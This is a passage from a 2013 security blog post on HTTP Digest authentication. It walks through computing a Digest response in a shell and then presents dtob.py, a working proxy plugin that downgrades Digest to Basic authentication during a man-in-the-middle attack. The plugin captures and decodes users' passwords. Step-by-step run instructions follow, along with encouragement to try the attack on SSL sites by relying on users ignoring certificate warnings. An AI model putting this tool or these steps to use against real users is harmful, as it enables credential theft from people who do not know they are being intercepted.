<span style=color:#75715e># Else, if the qop directive is &#39;auth-int&#39;</span>
<span style=color:#75715e># Where entity body is the actual response HTML from the doctype down to the last &lt;/html&gt;. See: http://www.w3.org/Protocols/rfc2616/rfc2616-sec7.html#sec7</span>
ha2 <span style=color:#f92672>=</span> md5<span style=color:#f92672>(</span>method : digestURI : md5<span style=color:#f92672>(</span>entityBody<span style=color:#f92672>))</span>

<span style=color:#75715e># Lastly, for the response, if the qop directive is &#39;auth&#39; or &#39;auth-int&#39;</span>
response <span style=color:#f92672>=</span> md5<span style=color:#f92672>(</span>ha1 : nonce : nonceCount : clientNonce : qop : ha2<span style=color:#f92672>)</span>
<span style=color:#75715e># Else, if qop is unspecified</span>
response <span style=color:#f92672>=</span> md5<span style=color:#f92672>(</span>ha1 : nonce : ha2<span style=color:#f92672>)</span>
</code></pre></div><p>So, lets take this formula, step by step and try and replicate the response <code>Authorisation</code> header in a shell. If one of the <code>WWW-Authenticate</code> headers don&rsquo;t make sense then I&rsquo;ll highly reccomend you read the RFC.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># Example of Calculating a Digest Authentication Response</span>
<span style=color:#75715e># header in a shell with a qop of &#34;auth&#34;</span>

<span style=color:#75715e># Assign some values to variables. These values will come from the above headers</span>
qop<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;auth&#34;</span>
realm<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;test.dev&#34;</span>
nonce<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;064af982c5b571cea6450d8eda91c20d&#34;</span>
uri<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/login&#34;</span>
cnonce<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;61417766e50cb980&#34;</span>
nc<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;00000001&#34;</span>
username<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;user.name&#34;</span> <span style=color:#75715e># This is what the user enters</span>
password<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;s3cr3tP@ssw0rd&#34;</span> <span style=color:#75715e># This is what the user enters</span>
method<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;GET&#34;</span>
<span style=color:#75715e># Start off with calculating ha1.</span>
<span style=color:#75715e># We do not have the algorithm directive specified, so ha1 is calculated as:</span>
$ ha1<span style=color:#f92672>=</span><span style=color:#e6db74>`</span>echo -n $username<span style=color:#e6db74>&#34;:&#34;</span>$realm<span style=color:#e6db74>&#34;:&#34;</span>$password | md5<span style=color:#e6db74>`</span>

<span style=color:#75715e># Confirm  that the value is set.</span>
$ print $ha1
d5d7ef83a9b3ad5bb0b5201b2bace033

<span style=color:#75715e># Next calculate the value of ha2.</span>
<span style=color:#75715e># Our application presented the qop directive as &#39;auth&#39;, so ha2 is calculated as:</span>
$ ha2<span style=color:#f92672>=</span><span style=color:#e6db74>`</span>echo -n $method<span style=color:#e6db74>&#34;:&#34;</span>$uri | md5<span style=color:#e6db74>`</span>

<span style=color:#75715e># Again, confirm that its set.</span>
$ print $ha2
315c3fb2f18fd4c6e5a3175e489464ad

<span style=color:#75715e># With both &#39;ha1&#39; and &#39;ha2&#39; set, we can calculate the response</span>
<span style=color:#75715e># We have the qop directive specified, so our response is calculated as:</span>
$ response<span style=color:#f92672>=</span><span style=color:#e6db74>`</span>echo -n $ha1<span style=color:#e6db74>&#34;:&#34;</span>$nonce<span style=color:#e6db74>&#34;:&#34;</span>$nc<span style=color:#e6db74>&#34;:&#34;</span>$cnonce<span style=color:#e6db74>&#34;:&#34;</span>$qop<span style=color:#e6db74>&#34;:&#34;</span>$ha2 | md5<span style=color:#e6db74>`</span>

<span style=color:#75715e># And did we get the right response?</span>
$ print $response
70eda34f1683041fd9ab72056c51b740
</code></pre></div><p><code>70eda34f1683041fd9ab72056c51b740</code> is the valid <code>response</code> header for this request. Note that the next client request will set <code>nc=00000002</code> and therefore the response will be different due to this value being part of the response calculation. However, the fact remains that the authorisation is continuously done via header exchanges between the client and the server, relying on the server to validate them.</p>
<p>It is also clear that this can not be easily reversed. Even though some attributes that make up the hash function are known, the username and password are at least hashed and factored into the response attribute. It is not impossible, though not as easy as Basic authentication.</p>
<h3 id=ok-so-i-now-get-how-the-basic-vs-digest-stuff-works-whats-next>O..K.. so I now get how the Basic vs Digest stuff works, whats next?<a hidden class=anchor aria-hidden=true href=#ok-so-i-now-get-how-the-basic-vs-digest-stuff-works-whats-next>#</a></h3>
<p>What if we could make the browser think that the server wants basic authentication, and then capture the encdoded credentials? That would mean we dont need any l33t cracking skeelz or anything. Just a <code>base64 -d</code>.</p>
<h3 id=downgrade-all-the-auth>Downgrade all the auth!<a hidden class=anchor aria-hidden=true href=#downgrade-all-the-auth>#</a></h3>
<p>Assuming you are able to get some form of MiTM between the client and the server, by whichever means you use, we can intercept the headers and change them to tell the browser that we actually want basic authentication. Remember, the browser responds based on what the server asks, so if the server only asks for Basic authentication&mldr; :D</p>
<p>&ldquo;Downgrade&rdquo; attacks are a known flaw in Digest authentication. Where Digest authentication is not necessarily vulnerable to MiTM attacks in the sense that the hash still needs to be cracked, Basic authentication is and therefore such an attack can prove to be valuable to an attacker.</p>
<h3 id=enough-talk-poc>Enough talk, PoC!<a hidden class=anchor aria-hidden=true href=#enough-talk-poc>#</a></h3>
<p>Using <a href=https://code.google.com/p/proxpy/>proxpy</a>, which is a pluggable python proxy server, I wrote a PoC demoing this exact attack. There are a lot of scenarios where this doesn&rsquo;t work very well, but this is only meant to demonstrate the problem.</p>
<h4 id=the-plugin>The plugin<a hidden class=anchor aria-hidden=true href=#the-plugin>#</a></h4>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e># dtob.py</span>
<span style=color:#75715e># Digest to Basic downgrade attack PoC plugin for proxpy (https://code.google.com/p/proxpy/)</span>
<span style=color:#75715e>#</span>
<span style=color:#75715e># 2013 Leon Jacobs</span>
<span style=color:#75715e># Licensed under IDC (I don&#39;t Care) license.</span>
<span style=color:#f92672>import</span> base64
<span style=color:#f92672>import</span> hashlib

<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>headerCleanup</span>(v):

    <span style=color:#75715e># strip annoying bracket things</span>
    v <span style=color:#f92672>=</span> v<span style=color:#f92672>.</span>translate(<span style=color:#66d9ef>None</span>, <span style=color:#e6db74>&#34;&#39;[</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#39;&#34;</span>)
    v <span style=color:#f92672>=</span> v<span style=color:#f92672>.</span>translate(<span style=color:#66d9ef>None</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#39;]&#39;&#34;</span>)

    <span style=color:#75715e># convert it to a list</span>
    headers <span style=color:#f92672>=</span> v<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;, &#39;</span>)

    <span style=color:#66d9ef>return</span> headers

<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>proxy_mangle_request</span>(req):

    v <span style=color:#f92672>=</span> str(req<span style=color:#f92672>.</span>getHeader(<span style=color:#e6db74>&#34;Authorization&#34;</span>))

    headers <span style=color:#f92672>=</span> headerCleanup(v)

    <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;Basic&#39;</span> <span style=color:#f92672>in</span> headers[<span style=color:#ae81ff>0</span>]:
        print <span style=color:#e6db74>&#34;[*] Basic Auth Response Detected.&#34;</span>
        credentials <span style=color:#f92672>=</span> headers[<span style=color:#ae81ff>0</span>]<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34; &#34;</span>)
        credentials <span style=color:#f92672>=</span> base64<span style=color:#f92672>.</span>b64decode(credentials[<span style=color:#ae81ff>1</span>])<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;:&#34;</span>)
        print <span style=color:#e6db74>&#34;[!] Found username &#39;</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#39; and password &#39;</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#39; for URL </span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> (credentials[<span style=color:#ae81ff>0</span>], credentials[<span style=color:#ae81ff>1</span>], str(req<span style=color:#f92672>.</span>url))

    <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;Digest&#39;</span> <span style=color:#f92672>in</span> headers[<span style=color:#ae81ff>0</span>]:
        print <span style=color:#e6db74>&#34;[x] Aww, the client responded with a Digest. </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>Were too late!</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74> :(&#34;</span>

    <span style=color:#66d9ef>return</span> req

<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>proxy_mangle_response</span>(res):

    v <span style=color:#f92672>=</span> str(res<span style=color:#f92672>.</span>getHeader(<span style=color:#e6db74>&#34;WWW-Authenticate&#34;</span>))

    headers <span style=color:#f92672>=</span> headerCleanup(v)

    <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;Digest&#39;</span> <span style=color:#f92672>in</span> headers[<span style=color:#ae81ff>0</span>]:

        <span style=color:#75715e># Swap out Digest for Basic :&gt;</span>
        header <span style=color:#f92672>=</span> str(headers[<span style=color:#ae81ff>0</span>])
        print <span style=color:#e6db74>&#34;[*] Found digest auth. Masquerading the response with a basic one :&gt;&#34;</span>
        res<span style=color:#f92672>.</span>setHeader(<span style=color:#e6db74>&#34;WWW-Authenticate&#34;</span>, <span style=color:#e6db74>&#34;Basic realm=pwnd&#34;</span>)

    <span style=color:#66d9ef>return</span> res
</code></pre></div><p>Lets get to it.</p>
<ol>
<li>
<p>At the core, this authentication downgrade attack PoC leverages off the ability to perform a MiTM between the client and server. How you get this MiTM is out of the scope of this article, but bear in mind that MiTM is not <strong>just</strong> arp spoofing clients. You could NAT web traffic to your proxy too&mldr; :)</p>
</li>
<li>
<p>Download <a href=https://code.google.com/p/proxpy/>proxpy</a> and extract it to a working directory.</p>
</li>
<li>
<p>Download and save the plugin from <a href=https://gist.github.com/th3l33k/5868963/raw/8b20c879ad68cd46fd470b86f9bdc7f33da4b097/dtob.py>here</a> into the <code>plugins/</code> directory in your proxpy working directory.</p>
</li>
<li>
<p>Start the proxy, specifying the port you&rsquo;d like it to run on, as well as telling it to load the plugin.
A sample command to get this running would be: <code>python proxpy.py -p 8090 -x plugins/dtob.py</code></p>
</li>
<li>
<p>Ensure that your MiTM is successful, and watch as digest authentication gets downgraded to basic auth, and your credentials echoed to the terminal :P Something like this&mldr;</p>
</li>
</ol>
<figure>
<img loading=lazy src=/images/dtobpoc.png>
</figure>
<h3 id=what-is-the-user-experience-with-this>What is the user experience with this?<a hidden class=anchor aria-hidden=true href=#what-is-the-user-experience-with-this>#</a></h3>
<p>That is a good question. The actual dialog that the user sees, again, is up to the browser to render. Depending on <strong>which</strong> browser you use on <strong>which</strong> OS, this may look different. In the back, the client <em>should</em> function normally, blissfully unaware that the headers for stronger authentication were swapped out.</p>
<p>On my computer, the authentication dialog has the follow look and feel:</p>
<figure>
<img loading=lazy src=/images/dtobhttpauth.png>
</figure>
<p>Notice the &ldquo;Server Says:&rdquo; Section. This is typically the <code>realm</code> part of the authentication request. When using the <code>dtob.py</code> plugin, it is changed to <code>pwnd</code>. This dialog looks no different when using any form of HTTP based authentication. Hence, when the downgrade attack occurs, the user is unaware that anything different is happening in the background.</p>
<h3 id=to-wrap-it-up>To wrap it up<a hidden class=anchor aria-hidden=true href=#to-wrap-it-up>#</a></h3>
<p>A few things to note here. Regardless of the HTTP Authentication method used, the client will not know <em>which</em> authentication method is actually being used without inspecting the headers etc. The plugin can technically be written to keep track of which URL&rsquo;s require Digest auth, and prepare valid responses ( like the one we did in the shell ) and present that back to the server. This will make the process completely smooth and the client unaware that something is going on. In the plugins current state, it will just continuously prompt the user for authentication as the proper request with the correct <code>Authorisation</code> header is never sent to the server.</p>
<p>On the case of SSL websites it obviously gets a little more tricky. Don&rsquo;t be put off with this. <strong>Countless</strong> times have I seen where users simply click the &ldquo;proceed anyways&rdquo; button regardless of the certificate validation errors that the browser presents them with. So, even though you will raise alarms on SSL encrypted websites, its still worth a try ^^</p>
</div>
<footer class=post-footer>
<nav class=paginav>
<a class=prev href=https://leonjza.github.io/blog/2013/07/27/stuff-to-gource./>
<span class=title>« Prev Page</span>
<br>
<span>'stuff' to Gource.</span>
</a>
<a class=next href=https://leonjza.github.io/blog/2013/06/23/quick-win-quickly-execute-last-shell-command/>
<span class=title>Next Page »</span>
<br>
<span>Quick Win: Quickly Execute Last Shell Command</span>
</a>
</nav>
<div class=share-buttons>
<a target=_blank rel="noopener noreferrer" aria-label="share dtob.py: Digest to Basic authentication; A simple example of a authentication 'downgrade' attack on twitter" href="https://twitter.com/intent/tweet/?text=dtob.py%3a%20Digest%20to%20Basic%20authentication%3b%20A%20simple%20example%20of%20a%20authentication%20%27downgrade%27%20attack&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f&hashtags="><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share dtob.py: Digest to Basic authentication; A simple example of a authentication 'downgrade' attack on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f&title=dtob.py%3a%20Digest%20to%20Basic%20authentication%3b%20A%20simple%20example%20of%20a%20authentication%20%27downgrade%27%20attack&summary=dtob.py%3a%20Digest%20to%20Basic%20authentication%3b%20A%20simple%20example%20of%20a%20authentication%20%27downgrade%27%20attack&source=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share dtob.py: Digest to Basic authentication; A simple example of a authentication 'downgrade' attack on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f&title=dtob.py%3a%20Digest%20to%20Basic%20authentication%3b%20A%20simple%20example%20of%20a%20authentication%20%27downgrade%27%20attack"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share dtob.py: Digest to Basic authentication; A simple example of a authentication 'downgrade' attack on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share dtob.py: Digest to Basic authentication; A simple example of a authentication 'downgrade' attack on whatsapp" href="https://api.whatsapp.com/send?text=dtob.py%3a%20Digest%20to%20Basic%20authentication%3b%20A%20simple%20example%20of%20a%20authentication%20%27downgrade%27%20attack%20-%20https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share dtob.py: Digest to Basic authentication; A simple example of a authentication 'downgrade' attack on telegram" href="https://telegram.me/share/url?text=dtob.py%3a%20Digest%20to%20Basic%20authentication%3b%20A%20simple%20example%20of%20a%20authentication%20%27downgrade%27%20attack&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
</a>
</div>
</footer>
</article>
</main>
<footer class=footer>
<span>@leonjza</span>
<span>
Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>
</span>
</footer>
<a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a>
<script>let menu=document.getElementById('menu');menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
<script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerText='copy';function d(){a.innerText='copied!',setTimeout(()=>{a.innerText='copy'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script>
</body>
</html>